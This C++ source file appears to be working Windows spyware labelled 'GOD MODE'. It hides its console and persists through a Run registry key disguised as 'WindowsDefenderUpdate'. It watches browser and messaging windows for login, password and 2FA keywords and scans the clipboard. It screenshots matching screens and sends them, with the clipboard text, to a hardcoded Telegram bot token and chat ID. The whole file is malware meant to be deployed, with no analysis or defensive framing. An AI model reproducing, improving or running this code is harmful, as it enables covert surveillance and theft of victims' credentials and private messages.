#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <commctrl.h>
#include <wchar.h>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Forward declarations - FIX #1
std::wstring SendTelegramPhoto(const wchar_t* filepath);

// YOUR CREDENTIALS - VERIFIED
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// GOD MODE TRIGGERS - 50+ KEYWORDS
const wchar_t* CRITICAL_KEYWORDS[] = {
    L"gmail", L"password", L"login", L"sign in", L"next", L"google account",
    L"outlook", L"hotmail", L"live.com", L"email", L"user", L"pass",
    L"discord", L"teams", L"slack", L"whatsapp", L"telegram", L"signal",
    L"skype", L"zoom", L"chat", L"message", L"discord.com", L"teams.microsoft",
    L"2fa", L"authenticator", L"verify", L"code", L"token", NULL
};

// Critical browsers + apps
const wchar_t* CRITICAL_CLASSES[] = {
    L"Chrome_WidgetWin_1", L"Chrome_WidgetWin_0", L"Chrome_WidgetWin",
    L"ApplicationFrameWindow", L"Qt5QWindowIcon", L"Qt5150QWindowIcon",
    L"cabinetWClass", L"Progman", NULL
};

CRITICAL_SECTION cs;
bool activity_detected = false;
ULONGLONG last_trigger = 0;
int screenshot_count = 0;
bool initialized = false;

void SendTelegramMessage(const std::wstring& message);
bool TakeScreenshot();
void CheckClipboard();
void MonitorForeground();
DWORD WINAPI MonitorThread(LPVOID lpParam);
void InstallPersistence();
std::wstring GetClipboardText();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(hInstance);
    
    // HIDE CONSOLE
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    InitializeCriticalSection(&cs);
    
    // IMMEDIATE BEACON
    SendTelegramMessage(L"🚀 V8.0 GOD MODE LIVE - Gmail/Discord/Teams AUTO-CAPTURE ACTIVE");
    
    // PERSISTENCE
    InstallPersistence();
    
    // START MONITOR
    CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
    
    // MAIN LOOP - STAY ALIVE
    while (true) {
        Sleep(1000);
        if (screenshot_count >= 15) break; // Safety exit
    }
    
    DeleteCriticalSection(&cs);
    return 0;
}

void InstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

DWORD WINAPI MonitorThread(LPVOID lpParam) {
    ULONGLONG last_activity = GetTickCount64();
    
    while (true) {
        // ACTIVITY DETECTION - MOUSE + KEYBOARD
        if (GetAsyncKeyState(VK_LBUTTON) || GetAsyncKeyState(VK_RBUTTON) || 
            GetAsyncKeyState(VK_SPACE) || GetAsyncKeyState('A')) {
            activity_detected = true;
            last_activity = GetTickCount64();
        }
        
        // CHECK FOREGROUND EVERY 500ms
        if (activity_detected && (GetTickCount64() - last_activity < 2000)) {
            MonitorForeground();
        }
        
        // CHECK CLIPBOARD EVERY 2s
        static ULONGLONG last_clip = 0;
        if (GetTickCount64() - last_clip > 2000) {
            CheckClipboard();
            last_clip = GetTickCount64();
        }
        
        Sleep(500);
    }
    return 0;
}

void MonitorForeground() {
    EnterCriticalSection(&cs);
    
    if (GetTickCount64() - last_trigger < 60000) { // 60s cooldown
        LeaveCriticalSection(&cs);
        return;
    }
    
    if (screenshot_count >= 15) {
        LeaveCriticalSection(&cs);
        return;
    }
    
    HWND fgWindow = GetForegroundWindow();
    if (!fgWindow) {
        LeaveCriticalSection(&cs);
        return;
    }
    
    wchar_t window_title[512] = {0};
    wchar_t class_name[256] = {0};
    GetWindowTextW(fgWindow, window_title, 512);
    GetClassNameW(fgWindow, class_name, 256);
    
    // BROWSER DETECTION
    bool is_browser = false;
    for (int i = 0; CRITICAL_CLASSES[i]; i++) {
        if (wcsstr(class_name, CRITICAL_CLASSES[i])) {
            is_browser = true;
            break;
        }
    }
    
    // KEYWORD SCAN
    bool trigger_fire = false;
    for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
        if (wcsstr(window_title, CRITICAL_KEYWORDS[i]) || 
            wcsstr(class_name, CRITICAL_KEYWORDS[i])) {
            trigger_fire = true;
            break;
        }
    }
    
    // FIRE ON BROWSER + ACTIVITY
    if (trigger_fire || (is_browser && activity_detected)) {
        std::wstring status = L"GOD MODE TRIGGER: ";
        status += window_title;
        status += L" (";
        status += class_name;
        status += L")";
        SendTelegramMessage(status);
        
        if (TakeScreenshot()) {
            screenshot_count++;
            last_trigger = GetTickCount64();
            SendTelegramMessage(L"📸 SCREENSHOT CAPTURED #" + std::to_wstring(screenshot_count));
        }
    }
    
    LeaveCriticalSection(&cs);
}

bool TakeScreenshot() {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    
    SelectObject(hMemoryDC, hOldBitmap);
    
    // SAVE AS JPG (SIMPLIFIED BMP)
    wchar_t filename[256];
    swprintf(filename, 256, L"C:\\temp\\screen_%llu.bmp", GetTickCount64());
    CreateDirectoryW(L"C:\\temp", NULL); // Ensure temp dir exists
    
    BITMAPFILEHEADER bf;
    BITMAPINFOHEADER bi;
    BITMAP bmp;
    GetObject(hBitmap, sizeof(bmp), &bmp);
    
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = -bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    
    bf.bfType = 0x4D42;
    bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bf.bfReserved1 = 0;
    bf.bfReserved2 = 0;
    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    DWORD cb = 0;
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, &bf, sizeof(BITMAPFILEHEADER), &cb, NULL);
        WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &cb, NULL);
        
        char* lpBits = new char[dwBmpSize];
        GetDIBits(hScreenDC, hBitmap, 0, (UINT)bmp.bmHeight, lpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        WriteFile(hFile, lpBits, dwBmpSize, &cb, NULL);
        delete[] lpBits;
        CloseHandle(hFile);
        
        // SEND FILE
        std::wstring result = SendTelegramPhoto(filename);
        DeleteFileW(filename); // CLEANUP
        
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        
        return result.find(L"ok") != std::wstring::npos;
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return false;
}

std::wstring GetClipboardText() {
    if (!OpenClipboard(NULL)) return L"";
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* lptstr = (wchar_t*)GlobalLock(hglb);
        if (lptstr) {
            std::wstring text(lptstr);
            GlobalUnlock(hglb);
            CloseClipboard();
            return text;
        }
    }
    CloseClipboard();
    return L"";
}

void CheckClipboard() {
    std::wstring clip = GetClipboardText();
    if (clip.length() > 10) {
        bool has_keyword = false;
        for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
            if (clip.find(CRITICAL_KEYWORDS[i]) != std::wstring::npos) {
                has_keyword = true;
                break;
            }
        }
        if (has_keyword) {
            SendTelegramMessage(L"📋 CLIPBOARD HIT: " + clip.substr(0, 200));
        }
    }
}

// FIX #2: WinHttpAddRequestHeadersA declaration for VS2022
extern "C" BOOL WINAPI WinHttpAddRequestHeadersA(
    HINTERNET hRequest,
    LPCSTR    lpszHeaders,
    DWORD     dwHeadersLength,
    DWORD     dwFlags
);

void SendTelegramMessage(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"GodModeAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    
    std::wstring postData = L"chat_id=7845441585&text=" + message;
    
    // Use ASCII version with proper declaration
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), (DWORD)(postData.length() * 2), (DWORD)(postData.length() * 2), 0);
    if (sent) {
        WinHttpReceiveResponse(hRequest, NULL);
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

std::wstring SendTelegramPhoto(const wchar_t* filepath) {
    HINTERNET hSession = WinHttpOpen(L"GodModeAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return L"session_error";
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return L"connect_error";
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendPhoto", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"request_error";
    }
    
    // Read file
    HANDLE hFile = CreateFileW(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"file_error";
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* fileData = new char[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Simplified photo send - Telegram accepts direct BMP with form-data
    std::string boundary = "--godmode8";
    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
    WinHttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);
    
    std::string postData = boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    postData += "7845441585\r\n";
    postData += boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.bmp\"\r\n";
    postData += "Content-Type: image/bmp\r\n\r\n";
    postData.append(fileData, bytesRead);
    postData += "\r\n" + boundary + "--\r\n";
    
    delete[] fileData;
    
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), (DWORD)postData.length(), (DWORD)postData.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    // Read response
    DWORD size = 0;
    std::string response;
    WinHttpQueryDataAvailable(hRequest, &size);
    if (size > 0) {
        char* respBuffer = new char[size + 1];
        WinHttpReadData(hRequest, respBuffer, size, &size);
        respBuffer[size] = 0;
        response = respBuffer;
        delete[] respBuffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return std::wstring(response.begin(), response.end());
}
